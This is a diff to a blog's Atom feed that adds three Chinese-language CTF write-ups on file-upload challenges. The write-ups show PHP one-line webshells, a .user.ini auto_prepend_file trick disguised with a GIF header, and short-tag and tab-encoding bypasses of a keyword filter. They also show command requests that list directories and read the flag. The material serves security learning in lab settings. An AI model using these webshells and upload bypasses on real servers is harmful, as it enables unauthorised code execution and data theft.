@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2023-11-21T08:44:33.071Z</updated>
+  <updated>2023-11-21T13:32:27.811Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CheckIn</title>
+    <link href="http://example.com/2023/11/21/[SUCTF-2019]CheckIn/"/>
+    <id>http://example.com/2023/11/21/[SUCTF-2019]CheckIn/</id>
+    <published>2023-11-21T12:51:11.755Z</published>
+    <updated>2023-11-21T13:32:27.811Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><h3 id><a href="#" class="headerlink" title></a><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311212051699.png" alt="image-20231121205124552"></h3><p>很明显文件上传＋马的问题</p><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311212052411.png" alt="image-20231121205225267"></p><p>cmd.jpg 上传成功发现里面有2个文件一个是刚刚的jpg</p><p>一个是index.php</p><p>文件上传的路径为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uploads/c55e0cb61f7eb238df09ae30a206e5ee </span><br></pre></td></tr></table></figure><p>抓包把文件路径修改为php3，php5，phtml都不行</p><p>显示</p><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311212057205.png" alt="image-20231121205721970"></p><p>而这道题没有采用<font color="red">文件重命名的方式</font></p><p>那么可以上传配置文件看一下</p><p>&#x3D;&#x3D;.user.ini&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=postcmd.jpg</span><br></pre></td></tr></table></figure><p>这个配置文件是在目录下的所有php文件加入shell.jpg文件里面的内容</p><p>所以可以把它当成刚刚的file_content那个函数</p><p>通过前天的题目知道文件上传的马最好用post请求参数这样可以连到蚂蚁上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为什么get不行 现在还不知道</span><br></pre></td></tr></table></figure><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311212101285.png" alt="image-20231121210139147"></p><p>传入成功</p><p>进行php文件测试 看是否我们的马进去了</p><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311212117803.png" alt="image-20231121211740308"></p><p>上传成功 蚂蚁连接</p><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311212118900.png" alt="image-20231121211803634"></p><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311212118945.png" alt="image-20231121211844531"></p><p>得到flag</p><h3 id="summary："><a href="#summary：" class="headerlink" title="summary："></a>summary：</h3><p>1：命名不要错，我的postcmd之前多加了一个空格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">postcmd .jpg</span><br></pre></td></tr></table></figure><p>而ini文件里又是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">postcmd.jpg</span><br></pre></td></tr></table></figure><p>导致后期一致连不上蚂蚁</p><p>2：还是post传参吧</p><p>步骤</p><p>1：先抓包改后缀</p><p>2：如果文件有被重命名，那么ini和hta感觉就用不上了</p><p>3：注意上传文件的路径，当前的路径不是上传的路径</p><p>所以你蚂蚁连接时的路径要注意</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;SUCTF-2019-CheckIn&quot;&gt;&lt;a href=&quot;#SUCTF-2019-CheckIn&quot; class=&quot;headerlink&quot; title=&quot;[SUCTF 2019]CheckIn&quot;&gt;&lt;/a&gt;[SUCTF 2019]CheckIn&lt;/h2&gt;&lt;h3 id&gt;</summary>
+      
+    
+    
+    
+    <category term="Web每日一题" scheme="http://example.com/categories/Web%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
+    
+    <category term="文件上传" scheme="http://example.com/categories/Web%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    
+    
+    <category term="web" scheme="http://example.com/tags/web/"/>
+    
+    <category term="刷题" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
+    
+  </entry>
   
   <entry>
     <title>六级备考之听力</title>
@@ -39,6 +67,62 @@
     
     
     <category term="听力" scheme="http://example.com/tags/%E5%90%AC%E5%8A%9B/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Upload</title>
+    <link href="http://example.com/2023/11/20/[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Upload/"/>
+    <id>http://example.com/2023/11/20/[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Upload/</id>
+    <published>2023-11-20T15:43:54.457Z</published>
+    <updated>2023-11-21T13:33:18.214Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”.php1”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”.pHp1”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”,”.ini</p><p> php <a href="https://so.csdn.net/so/search?q=%E6%9C%8D%E5%8A%A1%E5%99%A8&spm=1001.2101.3001.7020">服务器</a>可以把其他后缀的文件解析后可作为代码运行。</p><p>1：白名单</p><p><img src="https://s2.loli.net/2023/11/20/RjxrCGIcMky7HpZ.png" alt="image-20231120234113706"></p><p>试了一下上传jpg和配置文件htacess</p><p>任何发现jpg文件可以上传，所以知道它是白名单的文件上传</p><p><img src="https://s2.loli.net/2023/11/20/Sw92FsV3ZzOlApR.png" alt="image-20231120235158579"></p><p><img src="https://s2.loli.net/2023/11/21/6J78PWq3Ncafn1y.png" alt="image-20231121001103592"></p><p>发现只是前端的检查</p><p>可以上传htacess</p><p>所以会把所有的文件当成php来执行</p><p><img src="https://s2.loli.net/2023/11/21/RlAZUwvHLGdimjk.png" alt="image-20231121001220333"></p><p>马上传成功</p><p><img src="https://s2.loli.net/2023/11/21/9wLu4zVoO2g8MX5.png" alt="image-20231121001547863"></p><p>不知道为什么上传了hta上传了马还是不行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为那个配置文件命名确定只能.htacess那种 前面不能加东西</span><br></pre></td></tr></table></figure><p>2：重命名</p><p><img src="https://s2.loli.net/2023/11/20/SpJ4O8KytcG5N9s.png" alt="image-20231120235416629"></p><p><img src="https://s2.loli.net/2023/11/21/oLUSzGRQa68eNMX.png" alt="image-20231121000052563"></p><p>上传成功了但是测试phpinfo（）没有显示诶</p><p>试一下蚂蚁，也不行</p><p>看了题解，发现php不行测试php2，php5，phtml</p><p><img src="https://s2.loli.net/2023/11/21/dqgv31FeGUaYOPl.png" alt="image-20231121001822042"></p><p>虽然不知道为什么这个就行。。。</p><p><img src="https://s2.loli.net/2023/11/21/74K59WJTVE1HFCO.png" alt="image-20231121002141445"></p><p><img src="https://s2.loli.net/2023/11/21/yzp79isLI5XMtGn.png" alt="image-20231121002410316"></p><p>蚁剑只能连post 好吧记住了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://695a04c4-39f0-4f52-a475-d626b6c910c7.node4.buuoj.cn:81/uplo4d/eec4cd34266a99b471a4ebe1c5cb5488.phtml?cmd=system(%27ls%20/%27);</span><br></pre></td></tr></table></figure><p>找根目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var </span><br></pre></td></tr></table></figure><p>找到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=system(%27cat%20/flag%27);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d9571b24-da91-430a-bc77-307854476081&#125; </span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;ACTF2020-新生赛-Upload&quot;&gt;&lt;a href=&quot;#ACTF2020-新生赛-Upload&quot; class=&quot;headerlink&quot; title=&quot;[ACTF2020 新生赛]Upload&quot;&gt;&lt;/a&gt;[ACTF2020 新生赛]Upload&lt;/h2&gt;&lt;p&gt;</summary>
+      
+    
+    
+    
+    <category term="Web每日一题" scheme="http://example.com/categories/Web%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
+    
+    <category term="文件上传" scheme="http://example.com/categories/Web%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    
+    
+    <category term="web" scheme="http://example.com/tags/web/"/>
+    
+    <category term="刷题" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>write_shell</title>
+    <link href="http://example.com/2023/11/19/[%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021]write_shell/"/>
+    <id>http://example.com/2023/11/19/[%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021]write_shell/</id>
+    <published>2023-11-18T16:14:48.697Z</published>
+    <updated>2023-11-21T13:35:26.022Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><p>进行代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果input存在这些关键之则关闭程序</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">waf</span>(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果input是一个数据 则把</p><p><code>foreach($input as $key=&gt;$output)&#123;&#125;</code> 是一个循环，遍历数组 <code>$input</code>。在每次循环中，它会取出数组中的一个元素（作为 <code>$output</code>），并且将该元素的键名存储在变量 <code>$key</code> 中。</p><p>这行代码将 <code>waf()</code> 函数应用于 <code>$output</code>，然后将结果存回原数组 <code>$input</code> 的相应位置。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果文件存在dir变量 则查询这个地址</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将接收到的参数进行判断</p><p>如果action参数等于pwd 那么直接输出index.php的路径,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sandbox/c55e0cb61f7eb238df09ae30a206e5ee/</span><br></pre></td></tr></table></figure><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311211345198.png" alt="image-20231121134546048"></p><p>一开始进行访问的时候显示index文件没有，因为data参数还没有传进去，<font color="red">所以这个文件还没有被创建</font></p><p>如果action参数等于upload  那么它会从data中get参数</p><p>接着使用 <code>file_put_contents()</code> 函数将 <code>$data</code> 的内容写入到 <code>$dir</code> 目录下的 <code>index.php</code> 文件中。</p><p>所以就是你data内容会写到路径下的index.php里面，而不是当前的文件</p><p><img src="https://s2.loli.net/2023/11/19/DuqKyHZQseh5vfI.png" alt="image-20231119002857328"></p><p>初步思路就是在data传入一句话木马到index.php</p><p>一般正常来说的木马<font color="red"></font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/11/19/6B7PKR1JrSDj2pV.png" alt="image-20231119195927193"></p><p>因为preg_match 把php过滤了，所以要进行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">具体来说，这个正则表达式匹配的是：</span><br><span class="line"></span><br><span class="line">单引号 &#x27;</span><br><span class="line">空格</span><br><span class="line">下划线 _</span><br><span class="line">单词 php（不区分大小写，因为正则表达式中包含了 /i 标记，表示不区分大小写）</span><br><span class="line">分号 ;</span><br><span class="line">波浪号 ~</span><br><span class="line">脱字符 \</span><br><span class="line">加号 +</span><br><span class="line">eval 函数（在 PHP 中，eval 函数可以执行字符串中的 PHP 代码，这是一个非常危险的操作）</span><br><span class="line">大括号 &#123;</span><br></pre></td></tr></table></figure><p>可以用短标签进行绕过</p><p>这2个短标签默认不支持要进行配置文件的修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?? &gt;</span><br><span class="line"></span><br><span class="line">&lt;% %&gt;</span><br></pre></td></tr></table></figure><p>但是这个短标签是支持的</p><p>查询当前目录应该是ls+空格</p><p>但是空格被过滤了</p><p>所以%09</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`ls%09/`?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=@eval($_POST[&#x27;a&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>反引号和shell_exec()作用相同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">``</span><br></pre></td></tr></table></figure><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311211345938.png" alt="image-20231121134533714"></p><p>为啥我不行啊</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;?=`ls%09sandbox/c55e0cb61f7eb238df09ae30a206e5ee/`?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sandbox/c55e0cb61f7eb238df09ae30a206e5ee/</span><br></pre></td></tr></table></figure><p>wq！要把当前目录加上</p><p><img src="https://s2.loli.net/2023/11/19/n5siKgIM2mSL9Xl.png" alt="image-20231119203933810"></p><p><img src="https://s2.loli.net/2023/11/19/RfT2gw56hVk8Aod.png" alt="image-20231119204317175"></p><p><img src="https://s2.loli.net/2023/11/19/MdzNAI6GQxh2LiW.png" alt="image-20231119204444747"></p><p><img src="https://s2.loli.net/2023/11/19/8OfaYsitELjGquU.png" alt="image-20231119204935681"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=&lt;?=&#x27;cat%09/flag&#x27;?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311212047832.png" alt="image-20231121204750464"></p><p>插入后查询该目录</p><p>发现flag</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;红明谷CTF-2021-write-shell&quot;&gt;&lt;a href=&quot;#红明谷CTF-2021-write-shell&quot; class=&quot;headerlink&quot; title=&quot;[红明谷CTF 2021]write_shell&quot;&gt;&lt;/a&gt;[红明谷CTF 2021]wri</summary>
+      
+    
+    
+    
+    <category term="Web每日一题" scheme="http://example.com/categories/Web%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
+    
+    <category term="文件上传" scheme="http://example.com/categories/Web%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    
+    
+    <category term="web" scheme="http://example.com/tags/web/"/>
+    
+    <category term="刷题" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
     
   </entry>
   
